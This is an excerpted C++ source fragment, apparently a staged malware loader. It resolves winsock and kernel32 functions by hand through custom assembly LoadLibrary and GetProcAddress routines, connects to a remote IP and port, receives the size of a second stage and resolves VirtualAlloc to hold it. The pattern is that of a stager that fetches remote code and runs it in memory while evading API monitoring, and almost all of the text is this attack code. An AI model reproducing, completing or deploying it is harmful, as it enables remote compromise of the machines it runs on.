...
extern "C" HMODULE __fastcall asmLoadLibrary(const char* libName);
extern "C" FARPROC __fastcall asmGetProcAddress(void* libAddress, const char* funcName);
...
int main(int argc, const char * argv[])
{
	...
	HMODULE ws2_32 = asmLoadLibrary("ws2_32");
	printf("[+] Loaded ws2_32.dll: 0x%x\n", ws2_32);
	FARPROC wsastartup = asmGetProcAddress(ws2_32, "WSAStartup");
	printf("[+] Found WSAStartup function: 0x%x\n", wsastartup);
	FARPROC wsasocketa = asmGetProcAddress(ws2_32, "WSASocketA");
	...
	FARPROC connect = asmGetProcAddress(ws2_32, "WSAConnect");
	printf("[+] Found Connect function: 0x%x\n", connect);
	asmConnect(socket, ip, port, connect);
	FARPROC recv = asmGetProcAddress(ws2_32, "recv");
	printf("[+] Found Recv function: 0x%x\n", recv);
	asmRecv(socket, &stageSize, 4, recv);
	printf("[+] Obtained stage size: %d\n", stageSize);
	int stageSizeBak = stageSize;
	HMODULE kernel32 = asmLoadLibrary("kernel32");
	printf("[+] Loaded kernel32.dll: 0x%x\n", kernel32);
	FARPROC virtualAlloc = asmGetProcAddress(kernel32, "VirtualAlloc");
